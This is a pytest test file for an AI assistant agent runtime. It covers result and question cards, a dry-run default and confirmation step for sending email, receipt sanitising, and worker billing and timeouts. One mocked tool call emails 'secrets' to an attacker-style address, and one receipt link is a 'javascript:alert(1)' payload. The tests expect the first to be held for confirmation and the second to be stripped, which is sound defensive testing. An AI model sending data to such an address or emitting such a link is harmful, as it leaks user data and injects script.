from types import SimpleNamespace
from unittest.mock import AsyncMock, Mock
from uuid import uuid4

import pytest

from app.matcha.services.matcha_work.agent_runtime import (
    assistant,
    chat_progress,
    consent,
    conversation,
    grants,
    history,
    prompts,
    result,
    runner,
)
from app.matcha.services.matcha_work.agent_runtime.context import FrozenAction
from app.matcha.services.matcha_work.agent_runtime.registry import Target
from app.matcha.services.matcha_work.gmail_service import GMAIL_SCOPES
from app.workers.tasks import assistant as task

from .helpers import FakeClient, FakeConn, call, connection, response


def _run(**over):
    base = {"id": uuid4(), "company_id": uuid4(), "project_id": None, "channel_id": uuid4(),
            "requested_by": uuid4(), "trigger_message_id": uuid4(), "prompt": "find a standing desk",
            "surface": "assistant", "abilities": ["web", "shopping"], "resume_prompt_id": None,
            "requester_role": "client"}
    base.update(over)
    return base


@pytest.fixture
def wired(monkeypatch):
    conn = FakeConn([("SELECT email FROM users", "Ana@Example.com")])
    monkeypatch.setattr(assistant, "connection_or_direct", connection(conn))
    monkeypatch.setattr(conversation, "is_private_conversation", AsyncMock(return_value=True))
    monkeypatch.setattr(grants, "load_grants", AsyncMock(return_value={}))
    monkeypatch.setattr(history, "build_history", AsyncMock(return_value=([], ("find a standing desk",))))
    posted, broadcast = [], AsyncMock()

    async def persist(conn_, company_id, channel_id, content, *, metadata=None):
        posted.append((content, metadata))
        return {"id": str(uuid4())}

    monkeypatch.setattr(assistant, "persist_espresso_message", persist)
    monkeypatch.setattr(assistant, "broadcast_espresso_message", broadcast)
    monkeypatch.setattr(prompts, "persist_espresso_message", persist)
    mark = AsyncMock()
    monkeypatch.setattr(assistant.store, "mark_run", mark)
    monkeypatch.setattr(runner.store, "record_step", AsyncMock())
    monkeypatch.setattr(runner.store, "claim_step", AsyncMock(return_value=uuid4()))
    monkeypatch.setattr(runner.store, "resolve_step", AsyncMock())
    events = []

    async def publish(channel_id, event):
        events.append(event)

    monkeypatch.setattr(chat_progress, "_publish", publish)
    rehost = AsyncMock(return_value=["Dropped an image"])
    monkeypatch.setattr(assistant.images, "rehost_images", rehost)
    monkeypatch.delenv(assistant.COMMIT_MODE_ENV, raising=False)

    class Gmail:
        is_configured = False
        granted_scopes = frozenset()

        def __init__(self, user_id):
            pass

        async def load_token(self):
            return None

    from app.matcha.services.matcha_work import gmail_service

    monkeypatch.setattr(gmail_service, "GmailService", Gmail)

    def client(*responses):
        fake = FakeClient(list(responses))
        monkeypatch.setattr(assistant, "get_luna_client", Mock(return_value=fake))
        return fake

    return SimpleNamespace(conn=conn, posted=posted, mark=mark, events=events, rehost=rehost,
                           client=client, broadcast=broadcast, gmail=Gmail)


FINISH = {"headline": "Standing desk", "summary": "The sturdy one.", "confidence": "high"}


@pytest.mark.asyncio
async def test_an_answer_is_stored_and_posted_as_a_card(wired):
    client = wired.client(response(call("finish", FINISH)))
    run = _run()
    out = await assistant.run_assistant(run)
    assert out.kind == "result"
    stored = wired.mark.await_args.kwargs
    assert stored["status"] == "done" and stored["result"]["schema"] == "agent_result.v2"
    assert stored["model_calls"] == 1
    content, metadata = wired.posted[0]
    assert content == "Standing desk\n\nThe sturdy one."
    assert metadata["kind"] == "agent_result" and metadata["run_id"] == str(run["id"])
    assert metadata["result_v2"]["headline"] == "Standing desk"
    assert [e["status"] for e in wired.events] == ["running", "running", "done"]
    # What the model was given: the conversation, then the request, and one way to ask.
    names = [t.get("name") or t.get("type") for t in client.calls[0]["tools"]]
    assert names == ["web_search", "fetch_page", "ask_user", "finish"]
    assert client.calls[0]["input"][-1]["content"][0]["text"] == "find a standing desk"
    assert client.calls[0]["feature"] == assistant.USAGE_FEATURE
    assert "store" not in client.calls[0]


@pytest.mark.asyncio
async def test_picks_get_their_photos_rehosted(wired):
    pick = {"name": "Desk", "buy_links": [], "images": []}
    wired.client(response(call("finish", {**FINISH, "blocks": [{"type": "picks", "top_pick": pick}]})))
    run = _run()
    await assistant.run_assistant(run)
    kwargs = wired.rehost.await_args.kwargs
    assert kwargs["project_id"] == run["channel_id"] and kwargs["task_id"] == run["id"]
    assert wired.rehost.await_args.args[0]["type"] == "picks"
    assert wired.mark.await_args.kwargs["result"]["warnings"] == ["Dropped an image"]


@pytest.mark.asyncio
async def test_a_question_becomes_a_question_card(wired):
    wired.conn.on("INSERT INTO mw_agent_card_prompts", {"id": uuid4(), "expires_at": __import__("datetime").datetime(2026, 10, 1)})
    wired.client(response(call("ask_user", {"question": "Which day?", "options": ["Fri", "Sat"]})))
    out = await assistant.run_assistant(_run())
    assert out.kind == "question"
    assert wired.mark.await_args.kwargs["result"]["question"]["question"] == "Which day?"
    content, metadata = wired.posted[0]
    assert content == "Which day?" and metadata["prompt_kind"] == "ask_user"
    assert [b["label"] for b in metadata["view"]["buttons"]] == ["Fri", "Sat"]
    assert wired.events[-1]["note"] == "Waiting for your answer"
    assert wired.conn.ran("INSERT INTO mw_agent_card_prompts")[0][2][4] == "ask_user"


def _with_email(wired, monkeypatch, *, scopes=GMAIL_SCOPES):
    grants.load_grants.return_value = {"email": {}}
    wired.gmail.is_configured = True
    wired.gmail.granted_scopes = frozenset(scopes)

    async def status(self):
        return {"connected": True, "email": "Ana.Work@Example.org"}

    wired.gmail.get_status = status


@pytest.mark.asyncio
async def test_a_held_action_becomes_a_confirmation_card_and_nothing_is_sent(wired, monkeypatch):
    _with_email(wired, monkeypatch)
    wired.conn.on("INSERT INTO mw_agent_card_prompts", {"id": uuid4(), "expires_at": __import__("datetime").datetime(2026, 10, 1)})
    monkeypatch.setenv(assistant.COMMIT_MODE_ENV, "live")
    client = wired.client(response(call("send_email", {"to": ["eve@attacker.test"], "body": "secrets"})))
    out = await assistant.run_assistant(_run(abilities=["web", "shopping", "email"]))
    assert out.kind == "confirmation"
    insert = wired.conn.ran("INSERT INTO mw_agent_card_prompts")[0]
    assert insert[2][4] == "confirm_action"
    import json

    frozen = json.loads(insert[2][6])
    assert frozen["tool"] == "send_email" and frozen["args"]["to"] == ["eve@attacker.test"]
    assert frozen["targets"] == [{"kind": "email", "value": "eve@attacker.test", "ref": None}]
    content, metadata = wired.posted[0]
    assert "eve@attacker.test" in content and prompts.CONFIRM_HINT in content
    assert metadata["view"]["action"]["title"] == "Send an email"
    assert wired.mark.await_args.kwargs["result"]["held"]["tool"] == "send_email"
    # A run that can read mail is not stored by the provider.
    assert client.calls[0]["store"] is False


@pytest.mark.asyncio
async def test_own_addresses_are_the_login_and_the_connected_mailbox(wired, monkeypatch):
    _with_email(wired, monkeypatch)
    monkeypatch.setenv(assistant.COMMIT_MODE_ENV, "live")
    sent = []
    from app.matcha.services.matcha_work.agent_runtime.abilities import email

    async def send_email(self, to, subject, body, **kw):
        sent.append(to)
        return {"id": "s1"}

    wired.gmail.send_email = send_email
    monkeypatch.setattr(email, "_is_reserved_test_domain", lambda address: False)
    wired.client(
        response(call("send_email", {"to": ["ana.work@example.org", "ana@example.com"], "body": "note to self"})),
        response(call("finish", FINISH)),
    )
    out = await assistant.run_assistant(_run(abilities=["web", "shopping", "email"]))
    assert out.kind == "result" and sent == ["ana.work@example.org, ana@example.com"]
    receipt_content, receipt = wired.posted[0]
    assert receipt_content == "Done: Send an email"
    assert receipt["kind"] == "agent_receipt" and receipt["action_receipt"]["status"] == "done"


@pytest.mark.asyncio
async def test_dry_run_is_the_default_and_live_needs_the_exact_word(wired, monkeypatch):
    assert assistant.commit_mode() == "dry_run"
    for value in ("", "LIVE", "true", "1", "live "):
        monkeypatch.setenv(assistant.COMMIT_MODE_ENV, value)
        assert assistant.commit_mode() == ("live" if value.strip() == "live" else "dry_run"), value
    monkeypatch.setenv(assistant.COMMIT_MODE_ENV, "live")
    assert assistant.commit_mode() == "live"

    monkeypatch.delenv(assistant.COMMIT_MODE_ENV)
    _with_email(wired, monkeypatch)
    sent = []

    async def send_email(self, *a, **k):
        sent.append(a)

    wired.gmail.send_email = send_email
    wired.client(response(call("send_email", {"to": ["ana@example.com"], "body": "note"})),
                 response(call("finish", FINISH)))
    await assistant.run_assistant(_run(abilities=["email"]))
    assert sent == []
    assert wired.posted[0][0] == "Dry run (nothing was sent): Send an email"
    assert wired.posted[0][1]["action_receipt"]["status"] == "dry_run"


@pytest.mark.asyncio
async def test_a_project_chat_run_has_no_acting_tools_and_no_private_data(wired, monkeypatch):
    _with_email(wired, monkeypatch)
    client = wired.client(response(call("finish", FINISH)))
    await assistant.run_assistant(_run(surface="project_chat", project_id=uuid4()))
    conversation.is_private_conversation.assert_not_awaited()
    grants.load_grants.assert_not_awaited()
    names = [t.get("name") or t.get("type") for t in client.calls[0]["tools"]]
    assert names == ["web_search", "fetch_page", "ask_user", "finish"]
    assert "shared project chat" in client.calls[0]["instructions"]
    assert "store" not in client.calls[0]


@pytest.mark.asyncio
async def test_a_yes_is_carried_out_from_the_frozen_payload(wired, monkeypatch):
    _with_email(wired, monkeypatch)
    monkeypatch.setenv(assistant.COMMIT_MODE_ENV, "live")
    from app.matcha.services.matcha_work.agent_runtime.abilities import email

    monkeypatch.setattr(email, "_is_reserved_test_domain", lambda address: False)
    frozen = FrozenAction(
        tool="send_email",
        args={"to": ["eve@partner.test"], "subject": "Hi", "body": "Hello", "thread_id": None, "in_reply_to": None},
        targets=(Target("email", "eve@partner.test"),), preview={"title": "Send an email", "lines": []},
    )
    import json

    wired.conn.on("SELECT payload FROM mw_agent_card_prompts", json.dumps(frozen.to_payload()))
    sent = []

    async def send_email(self, to, subject, body, **kw):
        sent.append((to, subject, body))
        return {"id": "s1"}

    wired.gmail.send_email = send_email
    client = wired.client(response(call("finish", FINISH)))
    run = _run(resume_prompt_id=uuid4(), prompt="Yes, go ahead.")
    await assistant.run_assistant(run)
    assert sent == [("eve@partner.test", "Hi", "Hello")]
    lookup = wired.conn.ran("SELECT payload FROM mw_agent_card_prompts")[0]
    assert lookup[2] == (run["resume_prompt_id"], run["requested_by"])
    assert "status = 'answered' AND answer = 'yes'" in lookup[1]
    assert "The system has already carried it out" in client.calls[0]["instructions"]


@pytest.mark.asyncio
async def test_a_confirmation_that_was_not_a_yes_runs_nothing(wired):
    wired.conn.on("SELECT payload FROM mw_agent_card_prompts", None)
    wired.client()
    with pytest.raises(runner.AgentRunError, match="no longer valid"):
        await assistant.run_assistant(_run(resume_prompt_id=uuid4()))
    assert wired.posted == []


@pytest.mark.asyncio
async def test_ceilings_count_what_may_have_happened(wired):
    conn = FakeConn([("FROM mw_project_agent_steps", 7)])
    from app.matcha.services.matcha_work.agent_runtime.abilities import email

    user = uuid4()
    counts = await assistant.load_counts(conn, user, [email.build(gmail_factory=lambda ctx: None)])
    assert counts == {("send_email", 3600): 7, ("send_email", 86400): 7,
                      ("archive_email", 3600): 7, ("label_email", 3600): 7}
    query = conn.calls[0][1]
    assert "s.status IN ('ok', 'claimed', 'unknown')" in query and "result->>'weight'" in query
    assert conn.calls[0][2] == (user, "send_email", 3600.0)


def test_a_receipt_is_bounded_and_its_link_must_be_https():
    view = assistant.receipt_view({
        "action": "book_reservation", "title": "T" * 300, "status": "handoff",
        "lines": [{"label": "L" * 90, "value": "V" * 900, "mono": 1}, "junk"] + [{"label": "a", "value": "b"}] * 20,
        "link": {"label": "Finish", "url": "javascript:alert(1)"}, "note": "N" * 900,
    })
    assert len(view["title"]) == 160 and len(view["lines"]) == 7 and view["link"] is None
    assert len(view["lines"][0]["label"]) == 40 and len(view["lines"][0]["value"]) == 600
    assert view["lines"][0]["mono"] is True and len(view["note"]) == 300
    ok = assistant.receipt_view({"link": {"label": "Finish", "url": "https://tables.example/x"}})
    assert ok["link"]["url"] == "https://tables.example/x" and ok["status"] == "done" and ok["note"] is None
    assert assistant.receipt_text({"status": "unknown", "title": "Send an email"}) == "Outcome unknown: Send an email"
    assert assistant.receipt_text({"status": "failed"}) == "Did not go through: Done"
    assert assistant.receipt_text({"status": "handoff", "title": "Book"}) == "Over to you: Book"


@pytest.mark.asyncio
async def test_a_failure_is_said_in_chat_and_closes_the_progress_card(wired, monkeypatch):
    run = _run()
    await assistant.report_failure(run, "It took too long.")
    assert wired.events[-1]["status"] == "failed" and wired.events[-1]["note"] == "It took too long."
    assert wired.posted[-1][0] == "I couldn't finish that. It took too long."

    async def down(*_a, **_k):
        raise RuntimeError("chat is down")

    monkeypatch.setattr(assistant, "_post", down)
    await assistant.report_failure(run, "x")  # never raises


# ── the worker task ────────────────────────────────────────────────────────

@pytest.fixture
def worker(monkeypatch):
    from app import database
    from app.matcha.services.billing import token_budget_service
    from app.matcha.services.matcha_work.project_agent import store

    run = _run()
    conn = FakeConn([("UPDATE mw_project_agent_runs", {**run})])
    monkeypatch.setattr(database, "connection_or_direct", connection(conn))
    mark = AsyncMock()
    monkeypatch.setattr(store, "mark_run", mark)
    failure = AsyncMock()
    monkeypatch.setattr(assistant, "report_failure", failure)
    deduct = AsyncMock()
    monkeypatch.setattr(token_budget_service, "deduct_tokens", deduct)
    return SimpleNamespace(run=run, conn=conn, mark=mark, failure=failure, deduct=deduct)


@pytest.mark.asyncio
async def test_claims_runs_posts_result_and_deducts(worker, monkeypatch):
    async def run_assistant(run, *, stats):
        stats.update(model_calls=2, token_usage={"total_tokens": 900})
        return None

    monkeypatch.setattr(assistant, "run_assistant", run_assistant)
    await task._run(worker.run["id"])
    claim = worker.conn.ran("UPDATE mw_project_agent_runs")[0]
    assert "status = 'queued' AND kind = 'assistant'" in claim[1] and claim[2] == (worker.run["id"],)
    worker.mark.assert_not_awaited()
    worker.failure.assert_not_awaited()
    assert worker.deduct.await_args.args[1:] == (worker.run["company_id"], 900)


@pytest.mark.asyncio
async def test_a_run_already_claimed_does_nothing(worker, monkeypatch):
    worker.conn.on("UPDATE mw_project_agent_runs", None)
    ran = AsyncMock()
    monkeypatch.setattr(assistant, "run_assistant", ran)
    await task._run(uuid4())
    ran.assert_not_awaited()
    worker.deduct.assert_not_awaited()


@pytest.mark.asyncio
async def test_a_failure_closes_the_progress_card_and_keeps_the_spend(worker, monkeypatch):
    async def fails(run, *, stats):
        stats.update(model_calls=3, search_calls=2, token_usage={"total_tokens": 1200})
        raise runner.AgentRunError("The agent ran out of time before finishing.")

    monkeypatch.setattr(assistant, "run_assistant", fails)
    await task._run(worker.run["id"])
    kwargs = worker.mark.await_args.kwargs
    assert kwargs["status"] == "failed" and kwargs["model_calls"] == 3 and kwargs["search_calls"] == 2
    assert worker.failure.await_args.args[1] == "The agent ran out of time before finishing."
    assert worker.deduct.await_args.args[2] == 1200

    async def crashes(run, *, stats):
        raise KeyError("boom")

    monkeypatch.setattr(assistant, "run_assistant", crashes)
    await task._run(worker.run["id"])
    assert worker.failure.await_args.args[1] == "Something went wrong on my side."


@pytest.mark.asyncio
async def test_backstop_fails_a_stuck_run(worker, monkeypatch):
    import asyncio

    async def hangs(run, *, stats):
        await asyncio.sleep(30)

    monkeypatch.setattr(assistant, "run_assistant", hangs)
    monkeypatch.setattr(task, "RUN_DEADLINE_SECONDS", 0.01)
    await task._run(worker.run["id"])
    assert worker.mark.await_args.kwargs["status"] == "failed"
    assert worker.failure.await_args.args[1] == "It took too long."


@pytest.mark.asyncio
async def test_admins_and_empty_runs_are_not_charged_and_accounting_never_fails_a_run(worker, monkeypatch):
    await task._deduct_tokens({**worker.run, "requester_role": "admin"}, {"token_usage": {"total_tokens": 5}})
    await task._deduct_tokens(worker.run, {})
    worker.deduct.assert_not_awaited()
    worker.deduct.side_effect = RuntimeError("ledger down")
    await task._deduct_tokens(worker.run, {"token_usage": {"total_tokens": 5}})  # never raises


def test_the_task_runs_with_the_chat_fanout(monkeypatch):
    ran = []

    def fake_run(coro):
        ran.append(coro.__qualname__)
        coro.close()

    monkeypatch.setattr(task, "run_with_chat_fanout", fake_run)
    task.run_assistant.run(str(uuid4()))
    assert ran == ["_run"]
    from app.workers import celery_app

    assert "app.workers.tasks.assistant" in celery_app.celery_app.conf.include


@pytest.mark.asyncio
async def test_the_reconciler_closes_a_stale_assistant_runs_progress_card(monkeypatch):
    from app import database
    from app.matcha.services.matcha_work.agent_card import board
    from app.workers.tasks import project_agent as pa_worker

    stale = {"kind": "assistant", "project_id": None, "task_id": None, "id": uuid4(),
             "channel_id": uuid4(), "company_id": uuid4()}
    conn = FakeConn([("UPDATE mw_project_agent_runs", [stale, {
        "kind": "repo_question", "project_id": uuid4(), "task_id": None, "id": uuid4(),
        "channel_id": uuid4(), "company_id": uuid4()}])])
    monkeypatch.setattr(database, "connection_or_direct", connection(conn))
    failure = AsyncMock()
    monkeypatch.setattr(assistant, "report_failure", failure)
    progress = AsyncMock()
    monkeypatch.setattr(board, "set_progress", progress)
    await pa_worker._reconcile()
    failure.assert_awaited_once()
    assert failure.await_args.args[0]["id"] == stale["id"] and "interrupted" in failure.await_args.args[1]
    progress.assert_not_awaited()


def test_the_disclosures_say_where_the_data_goes():
    email = consent.DISCLOSURES["email"]
    text = " ".join(email.body)
    assert "OpenAI" in text and "Gemini" in text and email.version == "email-openai-1"
    assert "Gemini" in " ".join(consent.DISCLOSURES["reservations"].body)
    assert "never enters payment" in " ".join(consent.DISCLOSURES["reservations"].body)
    assert result.SCHEMA_VERSION == "agent_result.v2"
